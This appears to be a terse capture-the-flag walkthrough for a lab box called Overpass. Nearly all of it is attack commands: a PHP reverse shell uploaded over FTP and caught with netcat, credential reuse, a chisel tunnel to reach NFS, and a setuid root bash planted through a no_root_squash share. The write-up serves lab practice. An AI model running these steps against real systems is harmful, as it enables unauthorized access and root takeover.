# Overpass

Found:

* ftp service
* ssh service

`ftp 10.10.10.62`

Connect with username:password

In Kali: `find .* -name php-reverse-shell.php`

In ftp: `put php-reverse-shell.php`

In web browser: http://10.10.10.62/php-reverse-shell.php

In Kali: `nc -lvnp 1234` and wait for response from web browser

Then use same credentials like to ftp: `su paradox`

Linpeas found interesting NFS share with the `no_root_squash`

Find port where NFS is running: `rpcinfo -p | grep nfs`

In Kali create folder: `mkdir nfs`

In paradox: `./chisel client 10.10.157.200:9002 R:2049:127.0.0.1:2049`

In Kali: `chisel server --reverse --port 9002`

In Kali: `nc 127.0.0.1 2049 -vvv`

In Kali: `sudo mount -t nfs 127.0.0.1: nfs`

In Kali: `cd nfs` and found everything from james&#x20;

In James: `cp /usr/bin/bash /home/james`

In Kali in nfs folder: `sudo chown root:root: bash`

In Kali in nfs folder: `sudo chmod +s bash`

In James: `./bash -p`





